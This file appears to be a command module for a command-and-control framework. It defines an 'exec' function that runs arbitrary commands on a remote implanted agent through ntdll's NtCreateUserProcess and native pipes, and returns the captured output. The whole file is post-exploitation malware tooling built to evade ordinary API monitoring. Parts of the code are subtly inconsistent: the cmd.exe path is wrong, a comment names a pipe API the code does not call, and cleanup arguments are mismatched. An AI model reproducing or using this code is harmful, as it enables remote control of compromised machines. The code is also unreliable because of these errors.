NAME = "exec"
DESCRIPTION = "Execute a command using ONLY ntdll!NtCreateUserProcess, capturing output via Native pipes."
PARAMS = [
    {"name":"command_line", "description":"Command to run (e.g. whoami)", "type":"str"}
]
# Strictly Native API / NTDLL dependencies
DEPENDENCIES = [
    "CreatePipe",   # Create the \Device\NamedPipe\ for output
    "NtOpenFile",              # Open the client end of the pipe
    "NtAllocateVirtualMemory", # Buffer and Process Parameter allocation
    "NtCreateUserProcess",     # The core native process creator
    "RtlCreateProcessParametersEx", # Helper to build the PEB parameters
    "NtWaitForSingleObject",   # Wait for process exit
    "NtReadFile",              # Capture stdout
    "NtClose",                 # Cleanup handles
    "NtFreeVirtualMemory"      # Cleanup
]

def function(agent_id, args):
    from services.orders import read_from_agent
    import time
    
    command_raw = args[0]
    image_name = "\\??\\c:\\windows\\system\\cmd.exe"
    cmdline = "cmd.exe /c " + command_raw
    # Native paths usually require \??\ prefix for the executable
    # Example: \??\C:\Windows\System32\cmd.exe /c tasklist
    full_command = command_raw 
    
    # 1. CREATE NATIVE PIPE (\Device\NamedPipe\AgentOutput)
    # Replacing CreatePipe with NtCreateNamedPipeFile
    ret_createpipe = CreatePipe(agent_id, [])
    if ret_createpipe["retval"] == 0:
        return {"Result": "Failed to open a write handle to the pipe"}
    # 2. ALLOCATE BUFFER FOR OUTPUT (8KB)
    output_buf_size = 8192
    alloc_ret = NtAllocateVirtualMemory(agent_id, [output_buf_size, 0x04]) # PAGE_READWRITE
    p_output_buffer = alloc_ret["allocated_memory"]

    # 3. CONSTRUCT PROCESS PARAMETERS (RtlCreateProcessParametersEx)
    # This replaces the logic kernel32 uses to setup the environment and handles
    # We pass hPipeWrite for StdOutput and StdError
    hPipeWrite = ret_createpipe["WRITE_HANDLE"]
    hPipeRead = ret_createpipe["READ_HANDLE"]
    params_ret = RtlCreateProcessParametersEx(agent_id, [
        image_name,
        cmdline,
        hPipeWrite,
    ])
    
    if params_ret["retval"] != 0:
        NtClose(agent_id, [hPipeWrite])
        NtFreeVirtualMemory(agent_id, [p_output_buffer, output_buf_size])
        return {"Result": "Failed to initialize ProcessParameters"}
    p_process_params = params_ret["pProcessParams"]

    # 4. EXECUTE PROCESS (NtCreateUserProcess)
    # This involves the PS_ATTRIBUTE_LIST to specify image name and handle inheritance
    proc_ret = NtCreateUserProcess(agent_id, [
        p_process_params, 
        image_name,
        hPipeWrite # InheritHandles = True
    ])

    captured_output = ""
    if proc_ret["retval"] == 0: # STATUS_SUCCESS
        hProcess = proc_ret["PROCESS_HANDLE"]
        hThread  = proc_ret["THREAD_HANDLE"]

        # 5. WAIT FOR PROCESS (NtWaitForSingleObject)
        # Timeout: 10 seconds
        wait_ret = NtWaitForSingleObject(agent_id, [hProcess, 10000])
        
        # 6. READ OUTPUT
        # We read from the server end of the pipe
        read_ret = NtReadFile(agent_id, [hPipeRead, p_output_buffer, output_buf_size])
        
        if read_ret["retval"] == 0 or read_ret["retval"] == 0xC0000011: # SUCCESS or STATUS_END_OF_FILE
            raw_data = read_from_agent(agent_id, p_output_buffer, output_buf_size)
            captured_output = raw_data.decode('utf-8', errors='ignore').split('\x00')[0]

        # Cleanup process/thread handles
        NtClose(agent_id, [hProcess])
        NtClose(agent_id, [hThread])
    else:
        captured_output = f"Error: NtCreateUserProcess failed with NTSTATUS {hex(proc_ret['retval'])}"

    # 7. FINAL CLEANUP
    NtClose(agent_id, [hPipeRead])
    NtClose(agent_id, [hPipeWrite])
    # Cleanup the process parameters structure in agent memory
    NtFreeVirtualMemory(agent_id, [p_process_params, 0, 0x8000]) 
    NtFreeVirtualMemory(agent_id, [p_output_buffer, 0, 0x8000])

    return {
        "Result": "Success" if proc_ret["retval"] == 0 else "Failed",
        "Command": full_command,
        "Output": captured_output.strip(),
        "Status": hex(proc_ret["retval"])
    }